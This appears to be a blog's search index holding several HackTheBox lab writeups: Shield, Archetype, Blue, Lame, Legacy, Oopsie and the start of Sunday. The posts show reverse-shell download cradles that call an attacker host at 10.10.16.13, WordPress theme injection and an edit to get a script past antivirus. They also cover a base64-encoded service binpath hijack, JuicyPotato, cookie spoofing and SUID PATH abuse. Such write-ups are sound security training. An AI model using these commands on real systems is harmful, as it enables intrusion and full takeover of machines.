","date":"21-07-2021","objectID":"/posts/htb/shield/:2:1","tags":["juicy-potato","seImpersonatePrivilege"],"title":"HackTheBox - Shield Writeup","uri":"/posts/htb/shield/"},{"categories":["HacktheBox"],"content":"WordPress the result show this server have wordpress install as we know, the wordpress login path is /wp-admin let’s take a look ","date":"21-07-2021","objectID":"/posts/htb/shield/:2:2","tags":["juicy-potato","seImpersonatePrivilege"],"title":"HackTheBox - Shield Writeup","uri":"/posts/htb/shield/"},{"categories":["HacktheBox"],"content":"Admin Login Try to login as admin with credentials from previous box vaccine Success ","date":"21-07-2021","objectID":"/posts/htb/shield/:2:3","tags":["juicy-potato","seImpersonatePrivilege"],"title":"HackTheBox - Shield Writeup","uri":"/posts/htb/shield/"},{"categories":["HacktheBox"],"content":"Foothold/Gaining Access ","date":"21-07-2021","objectID":"/posts/htb/shield/:3:0","tags":["juicy-potato","seImpersonatePrivilege"],"title":"HackTheBox - Shield Writeup","uri":"/posts/htb/shield/"},{"categories":["HacktheBox"],"content":"WordPress Theme Injection Let’s try get the reverse shell by injected the theme I’m gonna use this theme “GutenBooster” and the shell I’m gonna use Nishang Now, I’m gonna put command in the 404.php. Which is a 404 template Source Wordpress: Reverse Shell \u003c?php exec('powershell IEX(IWR http://10.10.16.13:8000/rev.ps1 -UseBasicParsing)') ?\u003e This command will download the reverse shell and execute it Well, the reverse shell is succefully execute ","date":"21-07-2021","objectID":"/posts/htb/shield/:3:1","tags":["juicy-potato","seImpersonatePrivilege"],"title":"HackTheBox - Shield Writeup","uri":"/posts/htb/shield/"},{"categories":["HacktheBox"],"content":"SeImpersonatePrivilege everytime you’ve got powershell reverse shell make sure to run whoami /all The result Looks like SeImpersonatePrivilege is enable We can privesc by using juicy potato Source JuicyPotato - Github download the binary into local machine. Then, upload into victim machine via this command IWR http://10.10.16.34:8000/JuicyPotato.exe -outfile again_gimme.exe then run the binary. the result ","date":"21-07-2021","objectID":"/posts/htb/shield/:3:2","tags":["juicy-potato","seImpersonatePrivilege"],"title":"HackTheBox - Shield Writeup","uri":"/posts/htb/shield/"},{"categories":["HacktheBox"],"content":"Privilege Escalation First, I’m gonna make bat file with powershell command on it. I’m called the file yo_my.bat the command: Source IppSec - Making bat file powershell \"(IEX(IWR http://10.10.16.34:8000/rev.ps1 -UseBasicParsing))\" ","date":"21-07-2021","objectID":"/posts/htb/shield/:4:0","tags":["juicy-potato","seImpersonatePrivilege"],"title":"HackTheBox - Shield Writeup","uri":"/posts/htb/shield/"},{"categories":["HacktheBox"],"content":"POTATO I’m gonna run again_gimme.exe again with this flag: ./again_gimme.exe -t * -p yo_my.bat -l 9902 the result it is failed but we can try with more CLSID Source IppSec - JuicyPotato fails with the default CLSID, changing it up to get it working. Windows CLSID before we start using the CLSID. We’re need to know what type of OS version this machine running on by using this command: (Get-WmiObject Win32_OperatingSystem).Caption the result Now, we’re need to pick Windows Server 2016 Standard CLSID I’m gonna try with wpnservice CLSID I’m gonna run this command .\\again_gimme.exe -t * -p yo_my.bat -l 9902 -c '{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}' NOTE: Make sure you’re running the nc for listening the connection REMEMBER: The powershell command in the bat file was downloading another reverse shell file called rev.ps1. in that file. I’m listening on 9901. If you listen on the other port. Just change the port on that file. the result we’ve got the root flag ","date":"21-07-2021","objectID":"/posts/htb/shield/:4:1","tags":["juicy-potato","seImpersonatePrivilege"],"title":"HackTheBox - Shield Writeup","uri":"/posts/htb/shield/"},{"categories":["HacktheBox"],"content":"Conclusion I’ve learned a lot today. Do not put any credentials on the exposure machine to the hacker or non-secure machine. Even tho it’s happened, quickly change the password. I’m also introducing a bunch of tools for windows pentest/hack. Lastly, always update and patch the machine. I have a fun time doing this machine and I hope you guys do too. Bye ;) ","date":"21-07-2021","objectID":"/posts/htb/shield/:5:0","tags":["juicy-potato","seImpersonatePrivilege"],"title":"HackTheBox - Shield Writeup","uri":"/posts/htb/shield/"},{"categories":["HacktheBox"],"content":"Enumeration 1000 ports scan nmap -sC -sV -oN nmap/initial 10.10.10.27 initial nmap scan all ports scan full nmap scan ","date":"20-07-2021","objectID":"/posts/htb/archetype/:1:0","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"Open ports 135 (msrpc) 139 (smb 4 sure) 445 (smb 4 sure) 1433 (ms-sql-s/Microsoft SQL Server) ","date":"20-07-2021","objectID":"/posts/htb/archetype/:1:1","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"SMB Enum ","date":"20-07-2021","objectID":"/posts/htb/archetype/:2:0","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"CrackMapEXEC crackmapexec ","date":"20-07-2021","objectID":"/posts/htb/archetype/:2:1","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"smbclient smbclient wow backups shares. Let’s try connect to it. backup shares download the file using the get command ","date":"20-07-2021","objectID":"/posts/htb/archetype/:2:2","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"prod.dtsConfig content of the file \u003cDTSConfiguration\u003e \u003cDTSConfigurationHeading\u003e \u003cDTSConfigurationFileInfo GeneratedBy=\"...\" GeneratedFromPackageName=\"...\" GeneratedFromPackageID=\"...\" GeneratedDate=\"20.1.2019 10:01:34\"/\u003e \u003c/DTSConfigurationHeading\u003e \u003cConfiguration ConfiguredType=\"Property\" Path=\"\\Package.Connections[Destination].Properties[ConnectionString]\" ValueType=\"String\"\u003e \u003cConfiguredValue\u003eData Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;\u003c/ConfiguredValue\u003e \u003c/Configuration\u003e \u003c/DTSConfiguration\u003e we’ve got the credentials ARCHETYPE\\sql_svc:M3g4c0rp123 ","date":"20-07-2021","objectID":"/posts/htb/archetype/:2:3","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"Foothold/Gaining Access ","date":"20-07-2021","objectID":"/posts/htb/archetype/:3:0","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"mssqlclient.py[Impacket] mssqlclient syntax mssqlclient.py \u003cUserID\u003e@\u003cIP addr\u003e -windows-auth mssqlclient always do this after login enable_xp_cmdshell let’s try run whoami xp_cmdshell whoami Note: I’m using xp_cmdshell then whoami ","date":"20-07-2021","objectID":"/posts/htb/archetype/:3:1","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"Nishang Nishang Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. I’m gonna copy the Invoke-PowerShellTcp.ps1 into my www directory. Then, rename it to rev.ps1 copy PowerShellTcp.ps1 Open the rev.ps1 file and pick one of the example. Then copy and paste it on the last line of the code. Tip Make sure! change the ip and port PowerShellTcp.ps1 example examples modify PowerShellTcp.ps1 put in here and save it Time to upload the script into the machine by using mssqlclient.py that we connected. I’m gonna run python server inside www directory. python3 -m http.server Then try to uploaded using this command: xp_cmdshell powershell IEX(New-Object Net.WebClient).DownloadString(\\\"http://10.10.16.13:8000/rev.ps1\\\") And this happen blocked by AV it says this script got blocked by antivirus because of this function So, I change the function into something else. It works. execute again ","date":"20-07-2021","objectID":"/posts/htb/archetype/:3:2","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"User flag user flag ","date":"20-07-2021","objectID":"/posts/htb/archetype/:4:0","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"WinPEAS Upload the winpeas binary into the machine I’m gonna use powershell to know this machine architecture by using this command: (wmic os get OSArchitecture)[2] check OSArchitecture This machine is 64-bit. I’m gonna upload WinPEAS 64-bit version to work. I’m gonna copy and paste the WinPEAS binary into my www folder. Let’s upload it by using this command: IWR http://10.10.16.13:8000/winPEASx64.exe -OutFile winpeas.exe download WinPEAS Then run it by using this command .\\winpeas.exe ","date":"20-07-2021","objectID":"/posts/htb/archetype/:4:1","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"Privilege Escalation ","date":"20-07-2021","objectID":"/posts/htb/archetype/:5:0","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"UsoSvc WinPEAS just found this juicy stuff: UsoSVC modify services ","date":"20-07-2021","objectID":"/posts/htb/archetype/:5:1","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"Modify service binary path According this link If the group “Authenticated users” has SERVICE_ALL_ACCESS in a service, then it can modify the binary that is being executed by the service. ","date":"20-07-2021","objectID":"/posts/htb/archetype/:5:2","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"Encoded Command Here is the script before Encoded IEX(IWR http://10.10.16.13:8000/zzz.ps1 -UseBasicParsing) Time to encoded echo \"IEX(IWR http://10.10.16.13:8000/zzz.ps1 -UseBasicParsing)\" | iconv -t utf-16le | base64 -w 0 First, It’s gonna encoded into utf-16le Second, It’s gonna encoded into base64 Sources IppSec So, I’m gonna copy another powershell reverse shell by name it into zzz.ps1 Then upload it using this command: sc.exe config UsoSvc binpath=\"cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMQAzADoAOAAwADAAMAAvAHoAegB6AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA=\" After that, run this command sc.exe start UsoSvc create a service catch the shell we’ve got the reverse shell and become system! ","date":"20-07-2021","objectID":"/posts/htb/archetype/:5:3","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"Administrator Flag administrator flag ","date":"20-07-2021","objectID":"/posts/htb/archetype/:6:0","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"Conclusion I’ve learned a lot of tools today and how to do a PowerShell reverse shell. Ngl, this is a really fun box. I feel like my brain want to explode I have a fun time doing this machine and I hope you guys too. Bye ;) ","date":"20-07-2021","objectID":"/posts/htb/archetype/:7:0","tags":["reverse-powershell","legacy","smb","smbclient","crackmapexec","impacket-mssqlclient","mssql","xp_cmdshell","nishang","modify-services","windows-check-OS-architecture"],"title":"HacktheBox - Archetype Writeup","uri":"/posts/htb/archetype/"},{"categories":["HacktheBox"],"content":"Enumeration First, let’s do an enumeration with the IP address of this machine. I’m gonna run Nmap [Netwok Mapper] to scan any open ports. I’m gonna run this command nmap -sC -sV -oN nmap/initial 10.10.10.40 ","date":"20-07-2021","objectID":"/posts/htb/blue/:1:0","tags":["legacy","eternalblue"],"title":"HackTheBox - Blue Writeup","uri":"/posts/htb/blue/"},{"categories":["HacktheBox"],"content":"Explaining the nmap scan: -sC := scan using nmap default script -sV := scan for version -oN := output in normal format nmap initial scan The Nmap scan is done. The result shows us this is a Windows 7 machine and has smb! This is a very old machine. I’m pretty sure this is vulnerable to Eternalblue. Let’s run the Nmap smb-vuln script to double-check. nmap --script smb-vuln* -p139,445 -oN nmap/vuln_script 10.10.10.40 NSE check vulnerable to Eternalblue Yup. This machine is vulnerable to Eternalblue exploit. ","date":"20-07-2021","objectID":"/posts/htb/blue/:1:1","tags":["legacy","eternalblue"],"title":"HackTheBox - Blue Writeup","uri":"/posts/htb/blue/"},{"categories":["HacktheBox"],"content":"Foothold/Gaining Access I’m gonna run Metasploit and search for eternalblue and use it search Eternalblue exploit Before we run it. We need to set up the RHOSTS and LHOST. Make the lhost is set into your htb ip addr. setup listener ip and port ","date":"20-07-2021","objectID":"/posts/htb/blue/:2:0","tags":["legacy","eternalblue"],"title":"HackTheBox - Blue Writeup","uri":"/posts/htb/blue/"},{"categories":["HacktheBox"],"content":"Oopsie After that just type run. execute the exploit WE’RE IN AS SYSTEM!!! cool. Now, let’s hunt for the user \u0026 admin flag. ","date":"20-07-2021","objectID":"/posts/htb/blue/:3:0","tags":["legacy","eternalblue"],"title":"HackTheBox - Blue Writeup","uri":"/posts/htb/blue/"},{"categories":["HacktheBox"],"content":"User flag user flag ","date":"20-07-2021","objectID":"/posts/htb/blue/:4:0","tags":["legacy","eternalblue"],"title":"HackTheBox - Blue Writeup","uri":"/posts/htb/blue/"},{"categories":["HacktheBox"],"content":"Root/Admin flag root flag ","date":"20-07-2021","objectID":"/posts/htb/blue/:5:0","tags":["legacy","eternalblue"],"title":"HackTheBox - Blue Writeup","uri":"/posts/htb/blue/"},{"categories":["HacktheBox"],"content":"Conclusion I’ve learned a lot today. Please update the system. In this case, I’m able to exploit using EternalBlue and become root. That’s super scary. I have a fun time doing this machine and I hope you guys too. Bye ;) ","date":"20-07-2021","objectID":"/posts/htb/blue/:6:0","tags":["legacy","eternalblue"],"title":"HackTheBox - Blue Writeup","uri":"/posts/htb/blue/"},{"categories":["HacktheBox"],"content":"Enumeration First, let’s do an enumeration with the IP address of this machine. I’m gonna run Nmap [Netwok Mapper] to scan any open ports. I’m gonna run this command nmap -sC -sV -oN nmap/initial 10.10.10.3 ","date":"20-07-2021","objectID":"/posts/htb/lame/:1:0","tags":["samba","CVE-2007-2447"],"title":"HackTheBox - Lame Writeup","uri":"/posts/htb/lame/"},{"categories":["HacktheBox"],"content":"Explaining the nmap scan: -sC := scan using nmap default script -sV := scan for version -oN := output in normal format nmap initial scan The Nmap scan shows us port 21 is FTP and can log in as anonymous. However, I can’t find anything useful in there but the version of FTP looks vulnerable. I’ll try to exploit it again I failed. Turns out that particular version is already patch. So, yup. ","date":"20-07-2021","objectID":"/posts/htb/lame/:1:1","tags":["samba","CVE-2007-2447"],"title":"HackTheBox - Lame Writeup","uri":"/posts/htb/lame/"},{"categories":["HacktheBox"],"content":"Foothold/Gaining Access Also, we can see this machine has samba 3.0.20 maybe it’s useful for us. So, I’m searching smb exploit for this specific version samba 3.0.20 on the internet and I found this exploit. found samba exploit This exploit is available on metasploit. I’m gonna run my msfconsole . I’m gonna search this exploit and use it. select exploit from metasploit After that, I’m gonna set the important thing lhost and rhost. Then, I’m gonna run the exploit. ","date":"20-07-2021","objectID":"/posts/htb/lame/:2:0","tags":["samba","CVE-2007-2447"],"title":"HackTheBox - Lame Writeup","uri":"/posts/htb/lame/"},{"categories":["HacktheBox"],"content":"Oopsie shell as root WOW! I’M A ROOT USER. Unbelievable! Anyways let’s hunt the user and root flag ","date":"20-07-2021","objectID":"/posts/htb/lame/:3:0","tags":["samba","CVE-2007-2447"],"title":"HackTheBox - Lame Writeup","uri":"/posts/htb/lame/"},{"categories":["HacktheBox"],"content":"User flag user flag ","date":"20-07-2021","objectID":"/posts/htb/lame/:3:1","tags":["samba","CVE-2007-2447"],"title":"HackTheBox - Lame Writeup","uri":"/posts/htb/lame/"},{"categories":["HacktheBox"],"content":"Root flag root flag ","date":"20-07-2021","objectID":"/posts/htb/lame/:3:2","tags":["samba","CVE-2007-2447"],"title":"HackTheBox - Lame Writeup","uri":"/posts/htb/lame/"},{"categories":["HacktheBox"],"content":"Conclusion I’ve learned a lot today. First, please don’t allow FTP login as anonymous. Second, please update the system. In this case, I’m able to exploit the samba 3.0.20 and become root. That’s scary. I have a fun time doing this machine and I hope you guys too. Bye ;) ","date":"20-07-2021","objectID":"/posts/htb/lame/:4:0","tags":["samba","CVE-2007-2447"],"title":"HackTheBox - Lame Writeup","uri":"/posts/htb/lame/"},{"categories":["HacktheBox"],"content":"Enumeration First, let’s do an enumeration with the IP address of this machine. I’m gonna run Nmap [Netwok Mapper] to scan any open ports. I’m gonna run this command nmap -sC -sV -oN nmap/initial 10.10.10.4 ","date":"20-07-2021","objectID":"/posts/htb/legacy/:1:0","tags":["CVE-2008-4250","ms08-067","legacy"],"title":"HackTheBox - Legacy Writeup","uri":"/posts/htb/legacy/"},{"categories":["HacktheBox"],"content":"Explaining the nmap scan: -sC := scan using nmap default script -sV := scan for version -oN := output in normal format The result: nmap initial scan Again, using Nmap for scanning all ports but nothing new comes up. Anyway, the Nmap scan result shows us this is a Windows XP machine. Also, have smb on it. When I saw smb on Windows XP that’s will be an EternalBlue exploit but I’m gonna run the Nmap smb-vuln script anyway. nmap --script smb-vuln* -p139,445 10.10.10.4 -oN nmap/vuln_scan The result: NSE check smb vulnerability WOW! we’ve got the result back. The result shows us this machine vulnerable to RCE and Eternalblue attacks. ","date":"20-07-2021","objectID":"/posts/htb/legacy/:1:1","tags":["CVE-2008-4250","ms08-067","legacy"],"title":"HackTheBox - Legacy Writeup","uri":"/posts/htb/legacy/"},{"categories":["HacktheBox"],"content":"Foothold/Gaining Access So, I’m gonna use metasploit and seach ms08-067 and use it. use ms08-067 exploit Before we can use it. We need to set up the module first. So, I’m gonna set the RHOSTS into this machine ip address which is 10.10.10.4. Then, I’m gonna set the LHOST into tun0 which is my HTB ip address is. default metasploit option before modify metasploit option after After that just type run. get the shell ","date":"20-07-2021","objectID":"/posts/htb/legacy/:2:0","tags":["CVE-2008-4250","ms08-067","legacy"],"title":"HackTheBox - Legacy Writeup","uri":"/posts/htb/legacy/"},{"categories":["HacktheBox"],"content":"Oopsie The first thing we gonna check is whoami. So, I’m gonna use the getuid command shell as nt authority\\system COOL! WE’RE THE SYSTEM! Now, let’s hunt for the user \u0026 admin flag. ","date":"20-07-2021","objectID":"/posts/htb/legacy/:3:0","tags":["CVE-2008-4250","ms08-067","legacy"],"title":"HackTheBox - Legacy Writeup","uri":"/posts/htb/legacy/"},{"categories":["HacktheBox"],"content":"User flag user flag ","date":"20-07-2021","objectID":"/posts/htb/legacy/:3:1","tags":["CVE-2008-4250","ms08-067","legacy"],"title":"HackTheBox - Legacy Writeup","uri":"/posts/htb/legacy/"},{"categories":["HacktheBox"],"content":"Root/Admin flag root flag ","date":"20-07-2021","objectID":"/posts/htb/legacy/:3:2","tags":["CVE-2008-4250","ms08-067","legacy"],"title":"HackTheBox - Legacy Writeup","uri":"/posts/htb/legacy/"},{"categories":["HacktheBox"],"content":"Conclusion I’ve learned a lot today. Always, update your system. We can see this machine so vulnerable even the Nmap scan shows us there are 2 “holes” in it. That “hole” needs to fix/update ASAP. I have a fun time doing this machine and I hope you guys too. Bye ;) ","date":"20-07-2021","objectID":"/posts/htb/legacy/:4:0","tags":["CVE-2008-4250","ms08-067","legacy"],"title":"HackTheBox - Legacy Writeup","uri":"/posts/htb/legacy/"},{"categories":["HacktheBox"],"content":"Enumeration Top 1000 ports scan nmap -sC -sV -oN nmap/inital 10.10.10.28 nmap initial scan all ports scan nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.28 nmap allports scan Still the same result Open ports port 22 / ssh port 80 / http ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:1:0","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"The Website MegaCorp Automotive webpage ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:1:1","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"Gobuster Auto recon in the background looking the hidden directory gobuster dir -u http://10.10.10.28 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster.log The result gobuster This webpage have an upload directory. ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:1:2","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"Login Page Found something insteresting in the source code view source code the directory into /cdn-cgi/login/script.js navigate into http://10.10.10.28/cdn-cgi/login found the login page login page Got the credentials in previous box called Archetype in official pdf Successfully login as admin admin webpage ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:1:3","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"Can’t Upload navigate to the upload page it says super admin have right to view it can't view upload page ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:1:4","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"The ID id parameter This page appear to be user table base on the id parameter in the link Making python script for IDs brute-force ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:1:5","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"Foothold/Gaining Access ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:2:0","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"Python Script python script for ID brute force need cookies for authentication #!/usr/bin/env python3 import requests for i in range(101): url = f\"http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts\u0026id={i}\" c = {'user':'34322','role':'admin'} r = requests.get(url, cookies=c) if len(r.content) == 3595: # nothing appear just pass it pass else: print(f\"Check this ID out {i}\") print(\"Done\") The result brute-force id Here is the ID lead to (in order) {'access id':'34322','name':'admin','email':'admin@megacorp.com'} {'access id':'8832','name':'john','email':'john@tafcz.co.uk'} {'access id':'57633','name':'Peter','email':'peter@qpic.co.uk'} {'access id':'28832','name':'Rafol','email':'tom@rafol.co.uk'} {'access id':'xxxxx','name':'super admin','email':'superadmin@megacorp.com'} ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:2:1","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"Upload as super admin Found the super admin table found superadmin table Turns out the Access ID it is the cookie value Change the admin cookies into super admin admin cookie before superadmin cookie after refresh the page ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:2:2","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"Reverse Shell Upload the php reverse shell Here is the source upload php reverse shell Activated the reverse shell through this link execute the shell Got the shell shell as www-data ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:2:3","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"www-data Found the credentials in file called db.php in /var/www/html/cdn-cgi/login/db.php found robert credentials ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:2:4","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"Robert Login as robert change user to robert ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:2:5","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"User Flag user flag Find the SUID The command for find it find / -user root -perm -4000 -exec ls {} \\; 2\u003e/dev/null Found weird binary that not suppose to be there find all SUID ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:2:6","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"Privilege Escalation ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:3:0","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"Bugtracker This is how it works However it says no such file or directory cat error Try strings out the binary Turns out this binary use cat command However this is use relative path strings bugtracker explain the relative \u0026 absolute path relative \u0026 absolute path differences ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:3:1","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"Relative Path Abused Make a fake cat command by puting /bin/bash in it the bugtracker binary will execute this fake file as root source for relative path abused shell as root ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:3:2","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"Root Flag root flag ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:3:3","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":["HacktheBox"],"content":"Conclusion I’ve learned a lot today. Never put the user ID as cookies value and make sure you configure the website properly. Lastly, make sure to configure the SUID binary carefully and do not put any untrust or unpatched version as SUID I have a fun time doing this machine and I hope you guys too. Bye ;) ","date":"20-07-2021","objectID":"/posts/htb/oopsie/:4:0","tags":["SUID","path-abused","upload-vuln","gobuster","python","php-reverse-shell"],"title":"HackTheBox - Oopsie Writeup","uri":"/posts/htb/oopsie/"},{"categories":null,"content":"Nmap Like always, I’m going to scan the IP Address by using nmap but I’m going to scan the full port first. Then, I’m going to scan the only open ports. nmap -p79,111,515,6787,22022 -sCV -oN nmap/sunday 10.10.10.76 79/tcp open finger? | fingerprint-strings: | GenericLines: | No one logged on | GetRequest: | Login Name TTY Idle When Where | HTTP/1.0 ??? | HTTPOptions: | Login Name TTY Idle When Where | HTTP/1.0 ??? | OPTIONS ??? | Help: | Login Name TTY Idle When Where | HELP ??? | RTSPRequest: | Login Name TTY Idle When Where | OPTIONS ??? | RTSP/1.0 ??? | SSLSessionReq, TerminalServerCookie: |_ Login Name TTY Idle When Where |_finger: No one logged on\\x0D 111/tcp open rpcbind 2-4 (RPC #100000) 515/tcp open printer 6787/tcp open ssl/http Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14) | ssl-cert: Subject: commonName=sunday | Subject Alternative Name: DNS:sunday | Not valid before: 2021-12-08T19:40:00 |_Not valid after: 2031-12-06T19:40:00 | http-title: Solaris Dashboard |_Requested resource was https://10.10.10.76:6787/solaris/ |_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14 | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time 22022/tcp open ssh OpenSSH 7.5 (protocol 2.0) | 